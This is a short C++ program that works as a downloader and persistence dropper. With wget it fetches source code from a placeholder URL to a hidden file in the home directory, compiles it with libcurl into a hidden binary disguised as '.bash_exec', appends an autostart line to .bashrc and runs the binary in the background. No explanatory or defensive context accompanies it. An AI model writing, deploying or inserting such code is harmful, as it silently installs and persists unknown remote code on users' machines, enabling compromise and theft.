#include <iostream>
#include <string>
#include <filesystem>

int main(){
  std::filesystem::current_path(getenv("HOME"));
  std::system("cd ~/");
  std::system("wget --quiet -O .cme.cpp <SCRIPT_URL>");
  std::system("g++ .cme.cpp -o .bash_exec -lcurl");
  std::system("chmod +x .bash_exec");
  std::system("echo './.bash_exec &' >> .bashrc");
  std::system("./.bash_exec &");
  return 0;
}
